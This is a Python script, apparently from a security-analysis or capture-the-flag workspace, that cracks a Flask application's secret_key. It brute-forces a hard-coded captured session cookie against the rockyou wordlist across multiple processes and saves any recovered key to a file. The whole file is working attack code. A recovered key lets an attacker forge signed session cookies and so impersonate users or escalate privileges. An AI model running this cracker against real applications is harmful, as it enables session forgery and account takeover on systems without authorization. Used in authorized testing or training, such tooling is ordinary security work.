#!/usr/bin/env python3
"""Fast multiprocessing Flask secret_key cracker from captured session cookie."""
from __future__ import annotations

import argparse
import sys
from multiprocessing import Pool, cpu_count

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import BadSignature

DEFAULT_COOKIE = (
    ".eJyrVopPy0kszkgtVrKKrlZSKAFSSqlFRflFSjpKMaXmSYmGQNLEwCym1NTE1CKm1CLFCMQ2TjOPKTUzMgSxk5KBpLmFAVClpamhJVBNUmqaUmxtbC0AcJMdJQ.akx37g.POdYgMGMrLn2vgwC5vIqSrFn4G4"
)


def _try(args: tuple[str, str]) -> str | None:
    secret, cookie = args
    class A:
        secret_key = secret

    ser = SecureCookieSessionInterface().get_signing_serializer(A())
    try:
        ser.loads(cookie)
        return secret
    except BadSignature:
        return None


def crack(cookie: str, wordlist: str, workers: int, limit: int = 0) -> str | None:
    pool = Pool(workers)
    batch: list[tuple[str, str]] = []
    tried = 0
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.rstrip("\n\r")
            if not secret:
                continue
            batch.append((secret, cookie))
            if len(batch) >= 5000:
                for hit in pool.imap_unordered(_try, batch, chunksize=256):
                    if hit:
                        pool.terminate()
                        return hit
                tried += len(batch)
                batch.clear()
                if tried % 50000 == 0:
                    print(f"tried {tried}...", flush=True)
                if limit and tried >= limit:
                    break
        if batch and (not limit or tried < limit):
            for hit in pool.imap_unordered(_try, batch, chunksize=256):
                if hit:
                    pool.terminate()
                    return hit
    pool.close()
    return None


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--cookie", default=DEFAULT_COOKIE)
    ap.add_argument("--wordlist", default="/workspace/analysis/rockyou.txt")
    ap.add_argument("--workers", type=int, default=max(4, cpu_count()))
    ap.add_argument("--limit", type=int, default=0, help="max attempts (0=all)")
    args = ap.parse_args()
    print(f"cracking cookie={args.cookie[:40]}... workers={args.workers}")
    hit = crack(args.cookie, args.wordlist, args.workers, args.limit)
    if hit:
        print(f"FOUND: {hit}")
        open("/workspace/analysis/flask_secret_found.txt", "w").write(hit)
    else:
        print("not found")
        sys.exit(1)


if __name__ == "__main__":
    main()
